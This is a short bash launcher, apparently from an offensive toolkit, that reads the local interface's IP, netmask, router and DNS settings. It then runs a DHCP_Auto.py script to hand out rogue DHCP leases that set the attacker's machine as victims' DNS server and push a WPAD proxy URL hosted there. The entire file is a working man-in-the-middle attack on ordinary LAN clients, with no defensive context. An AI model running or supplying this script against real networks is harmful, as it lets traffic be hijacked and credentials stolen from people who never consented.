#!/bin/bash
# @author    : ALIF FUSOBAR
# @nickname  : Xcod3bughunt3r
# @license   : MIT FUCK LICENSE
# @contact   : master@itsecurity.id



if [ -z $1 ]; then
	echo "usage: $0 <interface>"
	exit
fi

if [ $EUID -ne 0 ]; then
	echo "Must be run as root."
	exit
fi

if [ ! -d "/sys/class/net/$1" ]; then
	echo "Interface does not exist."
	exit
fi

INTF=$1
PATH="$PATH:/sbin"
IPADDR=`ifconfig $INTF | sed -n 's/inet addr/inet/; s/inet[ :]//p' | awk '{print $1}'`
NETMASK=`ifconfig $INTF | sed -n 's/.*[Mm]ask[: ]//p' | awk '{print $1}'`
DOMAIN=`grep -E "^domain |^search " /etc/resolv.conf | sort | head -1 | awk '{print $2}'`
DNS1=$IPADDR
DNS2=`grep ^nameserver /etc/resolv.conf | head -1 | awk '{print $2}'`
ROUTER=`route -n | grep ^0.0.0.0 | awk '{print $2}'`
WPADSTR="http://$IPADDR/wpad.dat"
if [ -z "$DOMAIN" ]; then
	DOMAIN="  "
fi

echo "Running with parameters:"
echo "INTERFACE: $INTF"
echo "IP ADDR: $IPADDR"
echo "NETMAST: $NETMASK"
echo "ROUTER IP: $ROUTER"
echo "DNS1 IP: $DNS1"
echo "DNS2 IP: $DNS2"
echo "WPAD: $WPADSTR"
echo ""


echo python DHCP.py -I $INTF -r $ROUTER -p $DNS1 -s $DNS2 -n $NETMASK -d \"$DOMAIN\" -w \"$WPADSTR\"
sudo python DHCP_Auto.py -I $INTF -r $ROUTER -p $DNS1 -s $DNS2 -n $NETMASK -d \"$DOMAIN\" -w \"$WPADSTR\"
